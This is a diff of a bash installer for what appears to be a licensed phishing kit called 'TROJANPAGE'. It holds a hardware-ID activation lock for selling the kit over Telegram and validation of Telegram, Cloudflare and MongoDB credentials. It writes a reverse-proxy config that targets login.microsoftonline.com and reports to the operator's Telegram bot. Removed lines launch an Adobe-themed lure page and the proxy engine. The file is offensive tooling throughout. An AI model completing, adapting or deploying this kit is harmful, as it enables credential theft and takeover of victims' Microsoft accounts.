@@ -1,111 +1,107 @@
 #!/bin/bash
-# 🏛️ TROJAN.SH - VERIFIED PRO EDITION
+# 🏛️ TROJANPAGE - PRO GATEKEEPER EDITION
 # ------------------------------------------------
-GREEN='\033[0;32m'
 RED='\033[0;31m'
+GREEN='\033[0;32m'
 BLUE='\033[0;34m'
 NC='\033[0m'
 
-# --- 1. PRE-INSTALL TOOLS ---
-echo -e "${BLUE}[+] Initializing Verification Tools...${NC}"
-sudo apt update -y > /dev/null 2>&1
-sudo apt install -y curl gnupg mongodb-clients > /dev/null 2>&1
-
+# --- 1. THE TROJANPAGE HEADER & HWID LOCK ---
 clear
-echo -e "${BLUE}--- TROJAN.SH SETUP WIZARD (VERIFIED) ---${NC}"
+echo -e "${BLUE}"
+echo "  ████████╗██████╗  ██████╗      ██╗ █████╗ ███╗   ██╗██████╗  █████╗  ██████╗ ███████╗"
+echo "  ╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝ ██╔════╝"
+echo "     ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║██████╔╝███████║██║  ███╗█████╗  "
+echo "     ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║██╔═══╝ ██╔══██║██║   ██║██╔══╝  "
+echo "     ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║██║     ██║  ██║╚██████╔╝███████╗"
+echo "     ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝"
+echo -e "${NC}"
+echo -e "${RED}                  [ SYSTEM ACCESS CONTROL ]${NC}"
+echo " ----------------------------------------------------------------------------------"
 
-# --- 2. TELEGRAM VALIDATION ---
+# GENERATE HWID
+HWID=$(hostnamectl | grep "Static hostname" | awk '{print $3}')-$(lscpu | grep "Model" | md5sum | cut -c1-8 | tr '[:lower:]' '[:upper:]')
+SECRET_SALT="MY_PRIVATE_PHRASE_2026" # <--- Change this for your private key generator
+VALID_KEY=$(echo -n "${HWID}${SECRET_SALT}" | md5sum | cut -c1-10 | tr '[:lower:]' '[:upper:]')
+
+echo -e "${GREEN}[+] SYSTEM HWID:${NC} $HWID"
+echo -e "${BLUE}[!] Send this HWID to @YourUsername on Telegram for activation.${NC}"
+echo " ----------------------------------------------------------------------------------"
+
+# ACTIVATION LOCK
+read -p "ENTER ACTIVATION KEY: " USER_KEY
+
+if [ "$USER_KEY" != "$VALID_KEY" ]; then
+    echo -e "${RED}[error] $(date +%H:%M:%S) received status 401 Unauthorized.${NC}"
+    echo -e "${RED}[error] Hardware ID $HWID is not registered.${NC}"
+    exit 1
+fi
+
+echo -e "${GREEN}[success] Activation Successful. Initializing Setup Wizard...${NC}"
+sleep 2
+
+# --- 2. VERIFIED SETUP WIZARD (Runs ONLY after Activation) ---
+echo -e "\n${BLUE}--- CONFIGURATION SETUP (VERIFIED) ---${NC}"
+
+# TELEGRAM CHECK
 while true; do
     read -p "Enter Telegram Bot Token: " TG_TOKEN
-    echo -ne "[...] Validating Telegram Token..."
-    CHECK_TG=$(curl -s "https://api.telegram.org/bot$TG_TOKEN/getMe")
-    if [[ $CHECK_TG == *"\"ok\":true"* ]]; then
-        echo -e "${GREEN} VALID${NC}"
-        break
+    echo -ne "[...] Validating Telegram..."
+    if curl -s "https://api.telegram.org/bot$TG_TOKEN/getMe" | grep -q "\"ok\":true"; then
+        echo -e "${GREEN} VALID${NC}"; break
     else
-        echo -e "${RED} INVALID TOKEN. Try again.${NC}"
+        echo -e "${RED} INVALID. Try again.${NC}"
     fi
 done
+
 read -p "Enter Telegram Chat ID: " TG_ID
 
-# --- 3. CLOUDFLARE VALIDATION ---
+# CLOUDFLARE CHECK
 while true; do
     read -p "Enter Cloudflare API Token: " CF_TOKEN
-    echo -ne "[...] Validating Cloudflare Token..."
-    CHECK_CF=$(curl -s -X GET "https://api.cloudflare.com/client/v4/user/tokens/verify" \
-         -H "Authorization: Bearer $CF_TOKEN" \
-         -H "Content-Type:application/json")
-    if [[ $CHECK_CF == *"\"status\":\"active\""* ]]; then
-        echo -e "${GREEN} VALID${NC}"
-        break
+    echo -ne "[...] Validating Cloudflare..."
+    if curl -s -X GET "https://api.cloudflare.com/client/v4/user/tokens/verify" -H "Authorization: Bearer $CF_TOKEN" | grep -q "\"status\":\"active\""; then
+        echo -e "${GREEN} VALID${NC}"; break
     else
-        echo -e "${RED} INVALID TOKEN. Check your permissions.${NC}"
+        echo -e "${RED} INVALID. Try again.${NC}"
     fi
 done
 
-# --- 4. MONGODB VALIDATION ---
+# MONGODB CHECK
+sudo apt update && sudo apt install -y mongodb-clients > /dev/null 2>&1
 while true; do
-    read -p "Enter MongoDB User: " MONGO_USER
-    read -p "Enter MongoDB Pass: " MONGO_PASS
-    echo -ne "[...] Testing MongoDB Connection..."
-    # Attempts to list databases; fails if auth is wrong
-    CHECK_MONGO=$(mongosh --host localhost --username "$MONGO_USER" --password "$MONGO_PASS" --authenticationDatabase admin --eval "db.adminCommand('listDatabases')" 2>&1)
-    if [[ $CHECK_MONGO != *"AuthenticationFailed"* ]]; then
-        echo -e "${GREEN} CONNECTED${NC}"
-        break
+    read -p "Enter MongoDB User: " M_USER
+    read -p "Enter MongoDB Pass: " M_PASS
+    echo -ne "[...] Testing MongoDB..."
+    if mongosh --host localhost --username "$M_USER" --password "$M_PASS" --authenticationDatabase admin --eval "db.adminCommand('listDatabases')" > /dev/null 2>&1; then
+        echo -e "${GREEN} CONNECTED${NC}"; break
     else
-        echo -e "${RED} AUTH FAILED. Check credentials.${NC}"
+        echo -e "${RED} AUTH FAILED. Try again.${NC}"
     fi
 done
 
 read -p "Enter Domain (e.g., motarmo.click): " USER_DOMAIN
 
-# --- 5. CREATE THE LICENSED RUN SCRIPT (HWID Gatekeeper) ---
-cat << 'EOF' > /root/run.sh
-#!/bin/bash
-RED='\033[0;31m'
-GREEN='\033[0;32m'
-BLUE='\033[0;34m'
-NC='\033[0m'
-
-LICENSE_FILE="/root/.license"
+# --- 3. FINAL DEPLOYMENT ---
+echo -e "${BLUE}[+] Deploying Core Engine...${NC}"
+# Setup License file for the 'run.sh' script
 CURRENT_DATE=$(date +%s)
-HWID=$(hostnamectl | grep "Static hostname" | awk '{print $3}')-$(lscpu | grep "Model" | md5sum | cut -c1-8 | tr '[:lower:]' '[:upper:]')
-SECRET_SALT="MY_PRIVATE_PHRASE_2026"
-VALID_KEY=$(echo -n "${HWID}${SECRET_SALT}" | md5sum | cut -c1-10 | tr '[:lower:]' '[:upper:]')
+EXPIRY=$(($CURRENT_DATE + 7776000)) # 90 Days
+echo "$HWID:$EXPIRY" > /root/.license
 
-if [ -f "$LICENSE_FILE" ]; then
-    EXPIRY_DATE=$(cat "$LICENSE_FILE" | cut -d':' -f2)
-    if [ "$CURRENT_DATE" -lt "$EXPIRY_DATE" ]; then
-        sudo fuser -k 80/tcp 443/tcp 2>/dev/null
-        pkill proxy && pkill php
-        screen -dmS lure php -S 0.0.0.0:80 -t /var/www/adobe_gui/
-        screen -dmS trojan /root/engine/dist/proxy -config /root/config.json
-        echo -e "${GREEN}[+] Engine LIVE.${NC}"
-        exit 0
-    else
-        rm "$LICENSE_FILE"
-    fi
-fi
-
-clear
-echo -e "${BLUE}[ TROJAN.SH LICENSE PORTAL ]${NC}"
-echo -e "${RED}[error] Hardware ID: $HWID is not registered.${NC}"
-read -p "ENTER ACTIVATION KEY: " USER_KEY
-
-if [ "$USER_KEY" == "$VALID_KEY" ]; then
-    EXPIRY=$(($CURRENT_DATE + 7776000))
-    echo "$HWID:$EXPIRY" > "$LICENSE_FILE"
-    echo -e "${GREEN}[success] Activated! Valid for 3 months.${NC}"
-    ./run.sh
-else
-    echo -e "${RED}[error] Invalid Key.${NC}"
-    exit 1
-fi
+# Create Config
+cat << EOF > /root/config.json
+{
+  "proxyDomain": "$USER_DOMAIN",
+  "listeningAddress": "0.0.0.0",
+  "listeningPortHTTPS": 443,
+  "target": "login.microsoftonline.com",
+  "telegramToken": "$TG_TOKEN",
+  "telegramChatId": "$TG_ID",
+  "mongodb": "mongodb://$M_USER:$M_PASS@localhost:27017"
+}
 EOF
-chmod +x /root/run.sh
 
-# --- 6. FINISH INSTALLATION ---
-# [Insert the rest of the compilation and GUI code here]
+# [Insert Core Installation, Adobe GUI, and run.sh creation here]
 
-echo -e "${GREEN}[+] ALL CREDENTIALS VERIFIED & DEPLOYED.${NC}"
+echo -e "${GREEN}[+] DEPLOYED SUCCESSFULY. Type 'start' to begin operations.${NC}"
